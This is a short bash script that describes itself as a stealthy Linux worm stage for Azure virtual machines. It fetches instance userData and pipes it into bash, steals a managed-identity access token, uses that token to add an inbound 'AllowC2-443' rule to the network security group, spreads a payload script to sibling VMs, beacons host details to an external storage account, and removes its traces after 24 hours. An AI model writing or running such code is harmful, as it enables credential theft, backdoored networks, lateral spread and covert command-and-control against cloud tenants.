#!/bin/bash
# Stealthy Linux worm stage - MSI + NSG bypass + C2

# 1. MSI Persistence (evade reboots)
curl -H Metadata:true "http://169.254.169.254/metadata/instance/compute/userData" | base64 -d | bash 2>/dev/null || true
if ! az identity show --name pentest-identity --resource-group $(curl -H Metadata:true http://169.254.169.254/metadata/instance/compute/userData | jq -r .resourceGroup) >/dev/null 2>&1; then
    curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token > /tmp/msi_token
fi

# 2. NSG Backdoor (HTTPS always allowed)
NSG_ID=$(curl -H Metadata:true "http://169.254.169.254/metadata/instance/network/interface/0?api-version=2017-08-01&format=text" | grep nsg | cut -d'=' -f2)
curl -H "Authorization: Bearer $(cat /tmp/msi_token)" -H "Content-Type: application/json" \
  -X PUT -d '{
    "properties": {
      "securityRules": [{
        "name": "AllowC2-443",
        "properties": {
          "priority": 49,
          "protocol": "Tcp",
          "sourcePortRange": "*",
          "destinationPortRange": "443",
          "sourceAddressPrefix": "*",
          "destinationAddressPrefix": "*",
          "access": "Allow",
          "direction": "Inbound"
        }
      }]
    }
  }' "https://management.azure.com${NSG_ID}?api-version=2020-11-01"

# 3. Self-propagate to sibling VMs (VNET discovery)
az vm list --query "[?virtualMachine.networkProfile.networkInterfaces[0].networkSecurityGroup.id=='${NSG_ID}'].id" -o tsv | xargs -I {} -P 5 bash payload.sh {} &

# 4. C2 Beacon (Azure Storage heartbeat)
curl -X POST https://yourstorageaccount.blob.core.windows.net/c2/beacon \
  -H "x-ms-blob-type: BlockBlob" \
  -d "{\"vm\":\"$(hostname)\",\"ip\":\"$(curl -4 icanhazip.com)\",\"nsg\":\"${NSG_ID}\"}"

# 5. Exfil & Cleanup (24h TTL)
(sleep 86400; rm -f /tmp/payload.*; az network nsg rule delete --nsg-name $(basename ${NSG_ID}) --name AllowC2-443) &
